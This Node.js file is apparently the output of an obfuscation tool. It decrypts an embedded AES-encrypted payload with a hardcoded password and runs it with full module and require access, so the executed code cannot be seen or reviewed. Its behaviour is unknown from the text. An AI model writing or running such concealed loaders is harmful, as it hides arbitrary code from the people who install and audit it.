// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 4.1.1                                     ║
// ║  Encrypted: 2026-07-17 22:53:27 UTC                   ║
// ║  Cipher   : PBKDF2+AES-256-GCM                        ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v4.1.1
(async()=>{
  if(typeof require==='undefined')throw new Error('[Obfuscationary] Use Node.js.');
  const _b64='T0JGdjRbBM1LvvplGBLIEklwPn83y1wqZjGQFH1+Ms8MUfqIQvgyDHpbWm8tUauLJ+jULTXAJhRekUGBRlhlzMRiFcgx4zJgKEhf+WhDP5/LdY+vmp2RTe2SKKAbgLcQfVPUt2/2n7kitVrkuUnwTqkd5vcJcTfXYwPbyFn/gCIrKbxbH3G8KPtTeDspsqZaoS/xovJe4QdyPKuikBq6l5OZ90yfLoG/BQUoh3zLuxaBJlN8EuEUnXzI7iznNA2mvT3baNgxXnoPnf5JNnBtsiRFokWgBrRzL8GKqGPbT7MrifZKTmDKM4lukXiTPPlnAh0bOFwJhqCtsjL09IOO8GlEPPUMP1xSgayW7Ze04GAos/DQMvyWA/Y793SkycHFZ/rad7FQl593KUkl9BqQbTt2SjLIfo9hQIC+jompvKDTJqRVNmUWDjYqHcXJVMtuyBOcPB7NZMTLLNhdQOWgNrCE50z8MfFuRIokO4/J4SQCP0YCoYY9p8eCs6uP1Uu5lOqaCCcBGBjrcDIVPxm78CmJh4NY0vunsXT0a5eSRq/uXQjCfItNIwXOzw880C5Lvz3A3tT21WYgpw/EiW9V23p2cRvDRgz0QFuasJRjmja1Pyaf6RrSR4zGJ81x+Ff1sz1iHNqDWuvc5cmH2CGY+Mwhk5FgczIrcDhqmkCfJMhx9TCCOKPBBhwOAgeaGrmspFhcjthMRexF/zpdTYH63h5MoXPeVkIMuWjQNjuWFw9iWgMg7vFHVhTlXMy22kChKyHw1WhEYv9zhXpqoDo2eTPqf6AcvjU7EVr8tNwUFrZUkKKfKnUhTGEaqwbL8he67WT7Unzch0krBBNedcFINY0zY+MDBTI0SOTnv8F953N+rJ5bCiPBXD9Fs2gLgnxoFErASRMh5uNnZhN6fry8Bs5Mjsf/IJMbexgil/vqkFHconY2PDuR6yWy7MDCHmPNb5dbNheTCNrD1pnnNcVfuoBWvCw9RuKmXb7ndykHnbkIRskKwkJCacogkxZVlqyDJo81pylHyM9Hn7HXpIUWfcBwgQo6r06rCvKBmL/9ECUeI905+2SDbWI9UB3JPWTIZ73563jfZKKA21btGl8ec5TjszzBys0xI21D3a5hJz+izLYyIHyNV6K9/hJYZMgkVCzEy8+lCTJPom2I+COfFtMEVlWq6bccEOZf4ijbFpzu9fuyIJlbggOtNte807hAYFtwfr0CaPkHgS//0EqReueppM4O7jVDEN5HJZrqr6aBpv7i34PgUU0Sze5/3tm8WT+psilcor8V2NuYvee+SkkRHkLW25mIZ36qRl/mAL1lwBeK3VgMK7f00LrA1ipJUAVOf//9Z6PYWm4zHsDqjp20pVMmyenverz74YJY';const _IH='29e1b1258c660d5aaa0f337cc6c9f6a5634d8cd514f259f9d1281265a05523c8';let _src;

  const _PWDS=["change_this_to_a_long_random_secret"];
  const _MAGIC="OBFv4";
  const _c2=require('crypto');
  const _ah=_c2.createHash('sha256').update(_b64).digest('hex');
  if(_ah!==_IH)throw new Error('[Obfuscationary] Tamper detected!');
  let _d=Buffer.from(_b64,'base64');
  for(let i=_PWDS.length-1;i>=0;i--){
    const pw=_PWDS[i];
    if(!_d.toString('utf8',0,5).startsWith(_MAGIC))throw new Error('[Obfuscationary] Bad header');
    const blob=_d.slice(5);
    const s=blob.slice(0,16), iv=blob.slice(16,28), ct=blob.slice(28);
    const kk=_c2.pbkdf2Sync(pw,s,100000,32,'sha256');
    const dc=_c2.createDecipheriv('aes-256-gcm',kk,iv);
    const tag=ct.slice(ct.length-16), cdata=ct.slice(0,ct.length-16);
    dc.setAuthTag(tag);
    _d=Buffer.concat([dc.update(cdata),dc.final()]);
  }
  _src=_d.toString('utf8');

  const _import=(m)=>import(m);
  const _F=Object.getPrototypeOf(async function(){}).constructor;
  await _F('module','exports','require','__filename','__dirname','_import',_src)(module,exports,require,__filename,__dirname,_import);
})();
